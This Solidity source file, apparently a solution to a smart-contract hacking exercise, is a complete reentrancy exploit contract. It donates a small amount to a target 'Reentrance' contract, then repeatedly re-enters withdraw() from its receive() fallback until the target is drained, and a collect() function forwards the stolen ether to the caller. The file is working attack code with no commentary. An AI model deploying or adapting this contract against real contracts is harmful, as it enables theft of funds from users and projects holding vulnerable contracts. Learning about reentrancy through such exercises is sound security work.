// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol";

contract ReentranceAttack {
    Reentrance public target;
    uint256 public constant AMOUNT = 0.1 ether;

    constructor(address payable _targetAddress) {
        target = Reentrance(_targetAddress);
    }

    function startAttack() external payable {
        target.donate{value: AMOUNT}(address(this));
        target.withdraw(AMOUNT);
    }

    receive() external payable {
        uint256 targetBalance = address(target).balance;
        if (targetBalance >= AMOUNT) {
            target.withdraw(AMOUNT);
        }
    }

    function collect() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
